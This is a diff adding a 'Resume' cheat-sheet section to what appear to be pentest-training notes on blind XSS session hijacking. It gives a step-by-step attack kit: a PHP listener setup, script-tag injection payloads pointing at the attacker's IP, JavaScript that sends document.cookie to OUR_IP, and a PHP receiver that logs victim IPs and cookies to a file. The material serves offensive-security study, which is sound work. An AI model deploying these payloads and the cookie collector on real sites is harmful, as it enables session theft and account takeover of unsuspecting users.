@@ -68,3 +68,64 @@ Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
 Finally, we can use this cookie on the `login.php` page to access the victim's account. To do so, once we navigate to `/hijacking/login.php`, we can click `Shift+F9` in Firefox to reveal the `Storage` bar in the Developer Tools. Then, we can click on the `+` button on the top right corner and add our cookie, where the `Name` is the part before `=` and the `Value` is the part after `=` from our stolen cookie:
 
 <figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+### Resume
+
+#### Test to be Performed
+
+We set up a server and try XSS in inputs
+
+```bash
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:8000
+```
+
+<pre class="language-javascript"><code class="lang-javascript">&#x3C;script src="http://TU_IP:8000/username">&#x3C;/script>  ← lo pones en el campo 'username'
+&#x3C;script src="http://TU_IP:8000/fullname">&#x3C;/script>  ← lo pones en el campo 'fullname'
+## Test anothers payloads
+<strong>&#x3C;script src=http://TU_IP/username>&#x3C;/script>
+</strong>'>&#x3C;script src=http://TU_IP/username>&#x3C;/script>
+">&#x3C;script src=http://TU_IP/username>&#x3C;/script>
+</code></pre>
+
+>
+
+> Maybe there is a content field to enter url and redirect to our web server
+
+#### Malicious Payload
+
+```bash
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+## or
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+> Create this payload with name example _**script.js**_ in `/tmp/tmpserver`
+
+#### Build the receptor
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+> It save with name `index.php`
+
+#### Send the XSS injection and Wait
+
+```
+<script src="http://TU_IP:8000/script.js"></script>
+## or
+http://TU_IP:8000/script.js
+```
+
